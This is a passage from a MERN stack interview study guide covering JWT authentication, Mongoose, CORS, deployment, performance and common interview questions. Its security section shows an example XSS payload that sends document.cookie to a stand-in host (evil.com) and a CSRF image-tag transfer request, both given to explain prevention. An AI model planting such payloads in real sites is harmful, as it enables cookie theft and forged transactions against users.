    return children;
}

// Usage in router
<Routes>
    <Route path="/login" element={<LoginPage />} />
    <Route path="/dashboard" element={
        <ProtectedRoute>
            <Dashboard />
        </ProtectedRoute>
    } />
</Routes>
```

---

### Interview Questions — Authentication

**Q: What is JWT and how does it work?**
> JWT (JSON Web Token) is a self-contained token with three parts: Header (algorithm), Payload (user data like userId and role), and Signature (HMAC of the first two parts using a secret key). When a user logs in, the server creates a JWT and sends it to the client. The client sends the JWT with every request. The server verifies the signature — if valid, the request is authenticated. JWT is stateless — no session storage needed on the server.

**Q: Why should passwords be hashed? What is bcrypt?**
> Plain text passwords stored in a database are a massive security risk — if the database is breached, all user passwords are exposed. bcrypt is a hashing algorithm specifically designed for passwords. It converts the password into an irreversible hash, automatically adds a unique salt (prevents rainbow table attacks), and has a configurable work factor that makes brute force attacks computationally expensive.

**Q: Explain the full login flow in a MERN application.**
> 1. User submits email and password on the React form. 2. React sends POST to `/api/auth/login`. 3. Express finds the user by email in MongoDB. 4. bcrypt.compare() checks the entered password against the stored hash. 5. If matched, jwt.sign() creates a JWT with the user's ID. 6. Express returns the token in the response. 7. React stores the token in localStorage. 8. For subsequent requests, React adds `Authorization: Bearer <token>` to headers. 9. Express auth middleware verifies the token and allows access to protected routes.

---

> **Key Takeaways — Section 6**
> - Never store plain passwords — always hash with bcrypt before saving.
> - JWT = signed token with user data — stateless, scalable authentication.
> - JWT payload is Base64 encoded (readable by anyone), not encrypted. The signature ensures it hasn't been tampered with.
> - localhost: use localStorage. Production: use HttpOnly cookies.
> - Protected routes: check for valid token in middleware on every protected API and in React before showing protected pages.

---

## 7. Database: MongoDB + Mongoose

### What is MongoDB?

**MongoDB** is a **NoSQL document database**. Instead of tables and rows, it stores data as **collections of documents** in JSON-like format (called BSON).

---

### MongoDB vs SQL

| Feature | MongoDB (NoSQL) | SQL (PostgreSQL/MySQL) |
|---|---|---|
| Data format | JSON documents | Tables with rows and columns |
| Schema | Flexible (no fixed schema) | Fixed, enforced schema |
| Relationships | Embedded or references | Foreign keys and JOINs |
| Scaling | Horizontal (add more servers) | Vertical (bigger server) |
| Queries | MongoDB query language | SQL |
| ACID | Limited (improving) | Full ACID transactions |
| Best for | Flexible data, rapid development | Complex relations, strict data integrity |
| In MERN | Yes — JSON fits naturally with JS | Less common in MERN |

---

### MongoDB Terminology

| SQL | MongoDB | Example |
|---|---|---|
| Database | Database | `shop_db` |
| Table | Collection | `products` |
| Row | Document | `{ name: "T-Shirt", price: 500 }` |
| Column | Field | `name`, `price`, `category` |
| Primary Key | `_id` (ObjectId) | `64abc123def456` |
| JOIN | `$lookup` / embedded docs | Embedded or reference |

---

### Mongoose — ODM for MongoDB

**Mongoose** is an Object Data Modeling (ODM) library for MongoDB and Node.js. It provides:
- **Schema** — Define the shape and validation of documents
- **Model** — A class that wraps the collection and provides CRUD methods
- **Validation** — Built-in and custom validation rules

---

### Schema and Model Definition

```javascript
const mongoose = require('mongoose');

// Define Schema — the shape of documents in this collection
const productSchema = new mongoose.Schema({
    name: {
        type: String,
        required: [true, 'Product name is required'],
        trim: true,
        maxlength: [100, 'Name cannot exceed 100 characters']
    },
    price: {
        type: Number,
        required: true,
        min: [0, 'Price cannot be negative']
    },
    category: {
        type: String,
        enum: ['Electronics', 'Clothing', 'Food'],  // only these values allowed
        required: true
    },
    stock: {
        type: Number,
        default: 0
    },
    createdAt: {
        type: Date,
        default: Date.now
    },
    seller: {
        type: mongoose.Schema.Types.ObjectId,
        ref: 'User',    // reference to User collection
        required: true
    }
}, {
    timestamps: true  // auto-adds createdAt and updatedAt
});

// Create Model from Schema
const Product = mongoose.model('Product', productSchema);

module.exports = Product;
```

---

### CRUD Operations with Mongoose

```javascript
// CREATE — save a new document
const newProduct = new Product({
    name: 'Samsung Galaxy S24',
    price: 120000,
    category: 'Electronics',
    stock: 50,
    seller: req.user.userId
});
const saved = await newProduct.save();
// OR: const saved = await Product.create({ name, price, ... });

// READ — find documents
const allProducts = await Product.find();                          // all
const electronics = await Product.find({ category: 'Electronics' }); // filtered
const product = await Product.findById('64abc123...');             // by id
const oneProduct = await Product.findOne({ name: 'Samsung' });    // first match

// Sorting, pagination, field selection
const products = await Product.find()
    .sort({ price: -1 })    // descending by price
    .limit(10)               // max 10 results
    .skip(20)                // skip first 20 (page 3 = skip 20, limit 10)
    .select('name price');   // only return name and price fields

// UPDATE
const updated = await Product.findByIdAndUpdate(
    id,
    { $set: { price: 115000, stock: 45 } },
    { new: true, runValidators: true }
);

// DELETE
await Product.findByIdAndDelete(id);
// Or: await Product.deleteMany({ category: 'Electronics' });
```

---

### Relationships in MongoDB

#### Embedded Documents (Denormalized)
Nest related data directly inside the parent document.

```javascript
// User with embedded addresses
{
    _id: ObjectId("64abc..."),
    name: "Ali Ahmad",
    email: "ali@example.com",
    addresses: [
        { city: "Karachi", zip: "74000", isDefault: true },
        { city: "Lahore", zip: "54000", isDefault: false }
    ]
}
```

**Best when:** Data belongs to one parent and is always accessed together (user + addresses).

#### References (Normalized)
Store the ObjectId of the related document and use `.populate()` to fetch the full data.

```javascript
// Order references User and Product
const orderSchema = new mongoose.Schema({
    customer: { type: ObjectId, ref: 'User' },   // reference
    items: [{
        product: { type: ObjectId, ref: 'Product' },  // reference
        quantity: Number
    }],
    total: Number
});

// Fetch order with full customer and product data
const order = await Order
    .findById(orderId)
    .populate('customer', 'name email')         // populate customer
    .populate('items.product', 'name price');   // populate products
```

**Best when:** Data is shared across many documents or accessed independently (products can be in many orders).

---

### Embedded vs Reference

| | Embedded | Reference |
|---|---|---|
| Data stored | Inside parent document | Separate collection + ObjectId |
| Read performance | Fast (one query) | Slower (requires populate) |
| Write performance | Slower (update whole document) | Faster |
| Data duplication | Yes | No |
| Good for | Small, private, frequently read together | Shared data, large nested arrays |
| Example | User + addresses | Order + products |

---

### Basic Indexing in MongoDB

```javascript
// Add index to the schema
productSchema.index({ name: 'text' });    // text search index
productSchema.index({ price: 1 });        // ascending index on price
productSchema.index({ category: 1, price: -1 });  // compound index

// Without index: MongoDB scans ALL documents to find matches
// With index: MongoDB jumps directly to matching documents
```

**When to index:** Fields frequently used in `find()` queries, sort, and filter. Don't over-index — indexes slow down writes and take storage.

---

### Interview Questions — MongoDB

**Q: Why use MongoDB instead of a relational database like MySQL?**
> MongoDB is schema-flexible — documents in the same collection can have different fields, which is great for rapidly evolving data models in early-stage products. MongoDB's JSON format fits naturally with JavaScript, making it ideal for MERN. It also scales horizontally easily. However, for complex relational data with strict integrity requirements and complex joins, a relational database like PostgreSQL may be better.

**Q: What is the difference between embedded documents and references in Mongoose?**
> Embedded documents store related data directly inside the parent document — one query reads everything but data can be duplicated. References store only the ObjectId of the related document and use `.populate()` to fetch the full data — no duplication but requires an extra query. Use embedded for small, private data always accessed with the parent (user + addresses). Use references for shared data accessed independently (products in orders).

---

> **Key Takeaways — Section 7**
> - MongoDB: collections and documents (JSON) instead of tables and rows.
> - Schema = shape of documents. Model = class to interact with the collection.
> - CRUD: `create/save`, `find/findById`, `findByIdAndUpdate`, `findByIdAndDelete`.
> - Embedded: store inside parent (fast reads, data duplication). Reference: ObjectId + populate (no duplication, extra query).
> - Always index fields you frequently filter, sort, or search by.

---

## 8. Full Stack Integration

### How React Talks to the Node/Express Backend

```
React (frontend - port 3000)         Express (backend - port 5000)
           │                                    │
           │  HTTP Request                       │
           │  POST /api/auth/login               │
           │  { email, password }                │
           │ ──────────────────────────────────► │
           │                                     │  Validates input
           │                                     │  Queries MongoDB
           │                                     │  Creates JWT
           │  HTTP Response                      │
           │  { token, user }                    │
           │ ◄────────────────────────────────── │
           │                                     │
    React stores token                           │
    Redirects to dashboard                       │
```

React communicates with the Express backend exclusively via **HTTP requests** (using Axios or Fetch). They are completely separate applications running on different ports.

---

### CORS — Cross-Origin Resource Sharing

**CORS** is a browser security mechanism that blocks frontend JavaScript from making requests to a different domain/port than where the page was served from.

**The problem:**
```
React runs on: http://localhost:3000
Express runs on: http://localhost:5000

Browser says: "This React page is from port 3000. It's trying to talk 
to port 5000. That's a different origin. BLOCKED."
```

**The solution — tell the backend to explicitly allow the frontend's origin:**

```javascript
// In Express (backend)
const cors = require('cors');

// Allow all origins (development only — never use in production)
app.use(cors());

// Allow specific origins (production)
app.use(cors({
    origin: ['http://localhost:3000', 'https://myapp.vercel.app'],
    credentials: true,   // allow cookies to be sent
    methods: ['GET', 'POST', 'PUT', 'DELETE']
}));
```

**CORS is a browser restriction** — Postman and curl don't enforce it. That's why an API might work in Postman but fail in the browser.

---

### Environment Variables

Sensitive data (database URL, JWT secret, API keys) must **never be hardcoded in code**. Use `.env` files.

```bash
# .env file (never commit this to Git!)
MONGO_URI=mongodb+srv://user:pass@cluster.mongodb.net/mydb
JWT_SECRET=mySuperSecretKeyThatIsLong123!
PORT=5000
```

```javascript
// In Express
require('dotenv').config();
mongoose.connect(process.env.MONGO_URI);
jwt.sign(payload, process.env.JWT_SECRET);
```

```
# .gitignore
.env
node_modules/
```

---

### Deployment Basics

```
FRONTEND (React)                       BACKEND (Express + Node)
     │                                          │
Build: npm run build                   Deployed to a cloud server
Creates optimized static files         Always running, listening for requests
     │                                          │
     ▼                                          ▼
Host on Vercel or Netlify             Host on Render, Railway, or Heroku
(Free, auto-deploys from GitHub)      (Free tier available)
     │                                          │
     ▼                                          ▼
Gets a URL: myapp.vercel.app          Gets a URL: myapi.render.com
     │                                          │
     └────────── React calls ──────────────────►│
                 https://myapi.render.com/api   │
```

**Key deployment steps:**
1. **Frontend:** Run `npm run build`, deploy build folder to Vercel/Netlify. Set `REACT_APP_API_URL` environment variable to backend URL.
2. **Backend:** Push to GitHub, connect to Render. Set environment variables (MONGO_URI, JWT_SECRET) in the platform's dashboard.
3. **Database:** Use MongoDB Atlas (cloud MongoDB — free tier available). Connection string goes into backend's MONGO_URI env variable.

---

### Interview Questions — Full Stack Integration

**Q: What is CORS and why does it occur?**
> CORS (Cross-Origin Resource Sharing) is a browser security policy that blocks web pages from making requests to a different origin (domain, port, or protocol) than the page itself. In MERN development, React on port 3000 trying to call Express on port 5000 triggers a CORS error. The fix is to configure the Express backend to explicitly allow the React app's origin using the `cors` npm package.

**Q: How does React communicate with the backend?**
> React communicates with the Express backend through HTTP requests using Axios or the Fetch API. React sends HTTP requests (GET, POST, PUT, DELETE) to Express API endpoints. Express processes the request, interacts with MongoDB, and returns JSON responses. React then updates its state with the response data to re-render the UI.

---

> **Key Takeaways — Section 8**
> - React and Express are separate apps — they communicate only via HTTP.
> - CORS is a browser security restriction — fix it in Express using the `cors` package.
> - Never hardcode secrets — use `.env` files and `process.env`.
> - Deploy frontend to Vercel, backend to Render, database to MongoDB Atlas.

---

## 9. Security Basics

### What is XSS (Cross-Site Scripting)?

**XSS** is an attack where a malicious user injects JavaScript code into your website that then runs in other users' browsers.

**Example:**
```
Attacker submits a review with this text:
"Great product! <script>fetch('https://evil.com/steal?c=' + document.cookie)</script>"

If your app renders this without sanitizing:
Other users who view this review have their cookies stolen.
```

**Prevention:**
- Never render user input as raw HTML (`dangerouslySetInnerHTML` in React — avoid it)
- Sanitize all user input before displaying
- Use HttpOnly cookies — JavaScript cannot read them even if XSS runs
- React by default escapes HTML — `{userInput}` in JSX is safe

---

### What is CSRF (Cross-Site Request Forgery)?

**CSRF** is an attack where a malicious website tricks an already-authenticated user into unknowingly making a request to your site.

**Example:**
```
User is logged into mybank.com (session/cookie authenticated)
User visits evil.com which contains:
<img src="https://mybank.com/api/transfer?to=attacker&amount=50000">

Browser automatically sends the request with the auth cookie.
Bank processes the transfer because the cookie was valid.
```

**Prevention:**
- Use JWT in Authorization header (not cookies) — CSRF requires cookies to be sent automatically
- If using cookies: use `SameSite=Strict` or `SameSite=Lax` cookie attribute
- Use CSRF tokens for form submissions

---

### JWT Security Best Practices

```javascript
// 1. Use a strong, long secret key
JWT_SECRET=very-long-random-string-min-256-bits-generated-securely

// 2. Set expiry — never create tokens that never expire
jwt.sign(payload, secret, { expiresIn: '24h' });

// 3. Include only necessary data in payload
// BAD: { userId, name, email, address, role, password... }
// GOOD: { userId, role }  — minimum needed

// 4. Verify properly in middleware
try {
    jwt.verify(token, process.env.JWT_SECRET);
} catch (err) {
    // JsonWebTokenError: invalid token
    // TokenExpiredError: token expired
    return res.status(401).json({ message: 'Unauthorized' });
}
```

---

### Input Validation

Always validate on the **server side** — never trust client-side validation alone.

```javascript
// Using express-validator
const { body, validationResult } = require('express-validator');

app.post('/api/auth/register', [
    body('email').isEmail().normalizeEmail(),
    body('password').isLength({ min: 6 }).withMessage('Password min 6 chars'),
    body('name').notEmpty().trim().escape()
], (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
        return res.status(400).json({ errors: errors.array() });
    }
    // proceed with registration
});
```

---

### Security Checklist for MERN Apps

- [ ] Passwords hashed with bcrypt (never plain text)
- [ ] JWT secret stored in environment variable (not in code)
- [ ] JWT has expiry set
- [ ] All inputs validated and sanitized server-side
- [ ] HTTPS enforced in production
- [ ] CORS configured to allow only specific origins in production
- [ ] `.env` file in `.gitignore`
- [ ] No sensitive data in JWT payload
- [ ] Error messages don't expose internal details (stack traces)

---

> **Key Takeaways — Section 9**
> - XSS: injected malicious JS runs in other users' browsers — prevent with input sanitization and HttpOnly cookies.
> - CSRF: tricked authenticated users make unwanted requests — prevent with SameSite cookies or JWT in headers.
> - JWT: use strong secret, set expiry, store minimum data in payload.
> - Always validate input on the server — client-side validation is only for UX.

---

## 10. Performance Basics

### React: Avoiding Unnecessary Re-Renders

Every time state or props change, React re-renders the component. Unnecessary re-renders slow down the UI.

```jsx
// React.memo — prevents re-render if props haven't changed
const ProductCard = React.memo(function ProductCard({ product }) {
    return <div>{product.name} - Rs. {product.price}</div>;
});
// ProductCard won't re-render if its parent re-renders but product prop didn't change

// useCallback — stable function reference for child components
function ProductList({ products }) {
    const handleDelete = useCallback((id) => {
        // delete product
    }, []);  // function never changes

    return products.map(p => (
        <ProductCard key={p._id} product={p} onDelete={handleDelete} />
    ));
}

// useMemo — expensive calculation cached
const sortedProducts = useMemo(() => {
    return [...products].sort((a, b) => a.price - b.price);
}, [products]);  // only re-sorts when products array changes
```

---

### Lazy Loading in React

Load components only when they are needed, not all at once. This reduces the initial bundle size and speeds up the first page load.

```jsx
import { lazy, Suspense } from 'react';

// Instead of: import AdminPanel from './AdminPanel';
// Use:
const AdminPanel = lazy(() => import('./AdminPanel'));

function App() {
    return (
        <Suspense fallback={<div>Loading...</div>}>
            <Routes>
                <Route path="/admin" element={<AdminPanel />} />
            </Routes>
        </Suspense>
    );
}
// AdminPanel's code is only downloaded when the user navigates to /admin
```

---

### API Pagination

Never return all records at once — paginate API responses.

```javascript
// Backend — Express with pagination
app.get('/api/products', async (req, res) => {
    const page = parseInt(req.query.page) || 1;
    const limit = parseInt(req.query.limit) || 10;
    const skip = (page - 1) * limit;

    const total = await Product.countDocuments();
    const products = await Product.find().skip(skip).limit(limit);

    res.json({
        products,
        total,
        page,
        totalPages: Math.ceil(total / limit)
    });
});
// GET /api/products?page=2&limit=10  → returns items 11-20
```

```jsx
// Frontend — React fetching paginated data
const [page, setPage] = useState(1);

useEffect(() => {
    fetchProducts(page);
}, [page]);

<button onClick={() => setPage(p => p + 1)}>Next Page</button>
```

---

> **Key Takeaways — Section 10**
> - Use `React.memo` to prevent child re-renders when props haven't changed.
> - Use `useMemo` for expensive calculations, `useCallback` for stable function references.
> - Lazy load routes and heavy components — improves initial page load time.
> - Paginate all list API endpoints — never return all records at once.

---

## 11. Project Presentation, Interview Q&A, Mistakes & Cheat Sheet

### How to Present Your MERN Project in an Interview

Most fresh graduate interviews include "Tell me about your project." This is your chance to show real understanding.

**Framework for explaining your project:**

```
1. What it does (30 seconds):
"I built a full-stack e-commerce application where users can browse products,
add them to a cart, and place orders. Admins can manage products and view orders."

2. Tech stack and why:
"I used React for the frontend because of its component-based architecture and
state management with hooks. Node.js and Express for the REST API backend because
of its non-blocking I/O performance. MongoDB with Mongoose for the database
because the product catalog has flexible attributes."

3. Key features:
- User authentication with JWT and bcrypt password hashing
- Protected routes on both frontend and backend
- Product search and filter with pagination
- Admin dashboard with order management

4. Architecture:
"React talks to Express via Axios HTTP calls. Express routes handle the logic,
Mongoose models interact with MongoDB. All sensitive config is in .env files."

5. One challenge and how you solved it:
"The most challenging part was implementing the JWT authentication flow —
making sure the token is sent with every request and handling token expiry gracefully.
I solved it using an Axios interceptor that automatically attaches the token to every request header."

6. What you'd improve (shows maturity):
"If I were to rebuild it, I'd add Redis for caching frequently accessed products,
and use refresh tokens alongside access tokens for better security."
```

---

### 15 Most Asked Fresh Graduate MERN Interview Questions

**Q1: Explain the MERN stack architecture.**
> MERN = MongoDB (database) + Express.js (backend framework) + React.js (frontend UI) + Node.js (server runtime). React runs in the browser and sends HTTP requests to Express. Express handles routing, middleware, and business logic. Mongoose (with Node.js) communicates with MongoDB. All four use JavaScript — one language throughout the entire stack.

**Q2: What is the difference between props and state in React?**
> Props are read-only data passed from parent to child components — like function arguments. State is data owned and managed by the component itself — it can be changed with `useState`. When state changes, React re-renders the component. When parent re-renders with new props, the child also re-renders.

**Q3: What is the Virtual DOM and how does it make React fast?**
> The Virtual DOM is a lightweight in-memory copy of the real DOM. When state changes, React creates a new Virtual DOM, diffs it against the old one, and only updates the specific parts of the real DOM that changed. This minimizes expensive direct DOM manipulations and makes updates very fast.

**Q4: What are React hooks? Which ones have you used?**
> Hooks are functions that let functional components use React features like state and lifecycle. Most commonly used: `useState` (manage state), `useEffect` (API calls, side effects, lifecycle), `useContext` (consume Context), `useMemo` (cache expensive calculations), `useCallback` (stable function references).

**Q5: What is middleware in Express.js?**
> Middleware is a function with access to req, res, and next. It runs between the incoming request and the final route handler. Examples: `express.json()` parses request body, cors() adds CORS headers, and a custom auth middleware verifies JWT tokens. You call `next()` to pass to the next middleware; if you don't, the request stops.

**Q6: What is a REST API? How do you design one?**
> REST is an API architectural style using HTTP methods on resource-based URLs. Nouns in URLs (not verbs): GET `/api/products` (not `/getProducts`). HTTP methods as actions: GET=read, POST=create, PUT=replace, DELETE=remove. Stateless — no server sessions; every request contains all needed info. Return appropriate status codes (200, 201, 404, 500).

**Q7: How does Node.js handle multiple concurrent requests with a single thread?**
> Node.js uses non-blocking I/O and an event loop. When it encounters an I/O operation (database query, file read), it doesn't wait — it hands it off to the background and processes the next request. When the I/O completes, a callback runs. This allows one thread to handle thousands of concurrent connections efficiently.

**Q8: Why use MongoDB? When would SQL be better?**
> MongoDB is great for flexible schemas that evolve quickly, JSON-native data that fits naturally with JavaScript, and horizontal scaling. SQL is better when data has complex relationships requiring JOINs, when strict data integrity and ACID transactions are critical (banking), or when complex reporting queries are needed.

**Q9: What is JWT and how is authentication implemented?**
> JWT is a signed token containing user data (userId, role). After login, the server creates a JWT signed with a secret key and sends it to the client. The client stores it and sends it as `Authorization: Bearer <token>` with every request. The server verifies the signature in middleware — if valid, the request is authenticated. No session storage needed on the server — it's stateless.

**Q10: What is CORS and how do you fix it?**
> CORS is a browser security policy that blocks requests to a different origin (domain/port) than the page's origin. In MERN, React on port 3000 calling Express on port 5000 triggers CORS. Fix: install the `cors` npm package in Express and configure it to allow the React app's origin.

**Q11: What is bcrypt and why is it used?**
> bcrypt is a password hashing algorithm specifically designed for passwords. It converts a password into an irreversible hash (you can't decrypt it, only verify by rehashing). It automatically adds a unique salt to prevent rainbow table attacks and has a configurable work factor making brute force computationally expensive. Always hash passwords before storing.

**Q12: What is the difference between useEffect with different dependency arrays?**
> No dependency array: runs after every render. Empty array `[]`: runs once after mount (like componentDidMount). With values `[id, search]`: runs when `id` or `search` changes. The cleanup function in useEffect runs when the component unmounts or before the effect runs again.

**Q13: How do you handle errors in Express?**
> In route handlers, wrap async code in try/catch and call `next(error)` to pass errors to the error handling middleware. Define a global error handler as the last middleware with four parameters `(err, req, res, next)` — it catches all errors and returns a consistent JSON error response with appropriate status codes.

**Q14: What is Mongoose and why is it used with MongoDB?**
> Mongoose is an ODM (Object Data Modeling) library that provides a schema layer on top of MongoDB. It lets you define the shape and validation rules for documents (Schema), creates typed models for CRUD operations, supports middleware (pre/post hooks), and provides `.populate()` for reference-based relationships. Without Mongoose, MongoDB has no schema enforcement.

**Q15: How do you protect API routes in Express?**
> I create an `authMiddleware` function that extracts the token from the `Authorization: Bearer <token>` header, verifies it using `jwt.verify()` with the secret key, and attaches the decoded user info to `req.user`. I apply this middleware to routes that require authentication: `router.get('/profile', authMiddleware, getProfile)`. Unauthenticated requests get a 401 response.

---

### Common Mistakes Fresh Graduates Make

#### Mistake 1: Not Understanding the Backend Flow

**Problem:** Can build the React frontend but has no idea what happens on the server when a request arrives.

**Fix:** Trace every request: what middleware runs first? How does Express know which route matches? Where does the data go? Be able to explain `server.js` from top to bottom.

---

#### Mistake 2: Confusing State and Props

**Problem:** Mutating props directly, putting everything in state including derived data.

**Fix:**
- **Never** modify props — they are read-only for the child.
- Use `useMemo` for derived data (don't put filtered/sorted versions in state).
- State = data that changes over time and belongs to this component. Props = configuration passed from parent.

---

#### Mistake 3: Not Understanding the Authentication Flow

**Problem:** Copy-pasted login code from a tutorial, can't explain how the token gets verified on the backend.

**Fix:** Be able to draw the complete auth flow: registration → hashing → storage → login → comparison → JWT creation → client storage → request with token → middleware verification → route access. Know every single step.

---

#### Mistake 4: Copy-Pasting Projects Without Understanding

**Problem:** "I built a social media app" → "What does the user schema look like?" → "I'm not sure..."

**Fix:** Every line of your project code must be something you can explain. If you don't understand something, replace it with something simpler that you do understand. Interviewers will probe your project code.

---

#### Mistake 5: Not Handling Loading and Error States

**Problem:** Makes an API call but never shows loading indicator or handles errors.

**Fix:**
```jsx
const [data, setData] = useState(null);
const [loading, setLoading] = useState(true);
const [error, setError] = useState(null);

// Always handle all three states in the UI:
if (loading) return <Spinner />;
if (error) return <ErrorMessage message={error} />;
return <DataDisplay data={data} />;
```

---

### Final Revision Cheat Sheet

#### MERN Architecture — One-Liners

| Technology | Role | One-Line Summary |
|---|---|---|
| React.js | Frontend | Component-based UI library using Virtual DOM |
| Node.js | Runtime | Run JavaScript on the server, non-blocking I/O |
| Express.js | Framework | Middleware-based REST API framework for Node |
| MongoDB | Database | Flexible NoSQL document database, JSON format |
| Mongoose | ODM | Schema + Model layer for MongoDB |
| JWT | Auth | Signed stateless token for user authentication |
| bcrypt | Security | Password hashing — irreversible, salted |
| Axios | HTTP Client | Make HTTP requests from React to Express |
| CORS | Security | Browser policy — configure Express to allow React's origin |

---

#### React Hooks Quick Reference

| Hook | Purpose | Example |
|---|---|---|
| `useState` | Manage component state | `const [count, setCount] = useState(0)` |
| `useEffect` | Side effects, API calls, lifecycle | `useEffect(() => { fetch() }, [])` |
| `useMemo` | Cache expensive calculation | `useMemo(() => filter(arr), [arr])` |
| `useCallback` | Cache function reference | `useCallback(() => doThing(), [])` |
| `useContext` | Consume context value | `const { user } = useContext(UserCtx)` |
| `useParams` | Get URL params in React Router | `const { id } = useParams()` |

---

#### HTTP Status Codes — Quick Reference

| Code | Meaning | Use Case |
|---|---|---|
| 200 | OK | Successful GET, PUT |
| 201 | Created | Successful POST |
| 204 | No Content | Successful DELETE |
| 400 | Bad Request | Validation error |
| 401 | Unauthorized | No/invalid token |
| 403 | Forbidden | No permission |
| 404 | Not Found | Resource doesn't exist |
| 500 | Server Error | Unexpected bug |

---

#### Full Authentication Flow — Quick Summary

```
Register:  Form → POST /auth/register → validate → bcrypt.hash → save to DB → 201
Login:     Form → POST /auth/login → find user → bcrypt.compare → jwt.sign → token
Protected: Request + Bearer token → authMiddleware → jwt.verify → req.user → handler
```

---

#### Express Middleware Order

```
app.use(cors())             // 1. CORS headers
app.use(express.json())     // 2. Parse JSON body
app.use(logger)             // 3. Log request
app.use('/api/auth', authRoutes)   // 4. Auth routes (no token needed)
app.use('/api/...', authMiddleware, otherRoutes)  // 5. Protected routes
app.use(errorHandler)       // 6. Global error handler (LAST)
```

---

#### MongoDB + Mongoose Quick Reference

```javascript
// Schema
const schema = new mongoose.Schema({ name: String, price: Number });
const Model = mongoose.model('ModelName', schema);

// CRUD
await Model.create(data);           // Create
await Model.find({ category: 'x' }); // Read all matching
await Model.findById(id);           // Read one by id
await Model.findByIdAndUpdate(id, { $set: { price: 100 } }, { new: true }); // Update
await Model.findByIdAndDelete(id);  // Delete

// Relationships
await Model.findById(id).populate('fieldName', 'field1 field2');
```

---

#### MERN Project Folder Structure

```
project/
├── frontend/                 (React app)
│   ├── src/
│   │   ├── components/       (reusable UI pieces)
│   │   ├── pages/            (page-level components)
│   │   ├── context/          (Context API)
│   │   ├── hooks/            (custom hooks)
│   │   ├── api/              (Axios setup + API functions)
│   │   └── App.js
│   └── package.json
│
└── backend/                  (Node + Express app)
    ├── models/               (Mongoose schemas/models)
    ├── routes/               (Express route files)
    ├── middleware/            (auth + error middleware)
    ├── controllers/          (route handler functions)
    ├── .env                  (secret — never commit)
    ├── server.js             (entry point)
    └── package.json
```

---

#### Final Analogy Card

| Concept | Analogy |
|---|---|
| React Component | LEGO brick — reusable, combinable |
| State | Component's own notebook — private memory |
| Props | Instructions passed from parent |
| Virtual DOM | Comparing drafts before publishing |
| Node.js Event Loop | Restaurant waiter handling many tables without waiting |
| Express Middleware | Security checkpoints before entering a building |
| JWT | A signed ID card — verifiable without calling HQ |
| bcrypt | A one-way blender — you can blend but not unblend |
| CORS | A border control — only allow authorized visitors |
| MongoDB Document | A row but as a flexible JSON document |
| Mongoose Schema | A form template with required fields and rules |

---

> **Final Tip for Pakistani Software Company MERN Interviews**
>
> Companies like Arbisoft, 10Pearls, Systems Ltd, Devsinc, and Netsol frequently ask:
>
> **Props vs State → Virtual DOM → React Hooks (useEffect) → REST API design → Middleware → JWT auth flow → MongoDB vs SQL → CORS**
>
> Know these eight topics deeply with real examples from your own project.
> Being able to walk through your project's authentication system from registration to protected route access is often what separates hired candidates from rejected ones.

---

*End of MERN Stack Interview Study Guide*
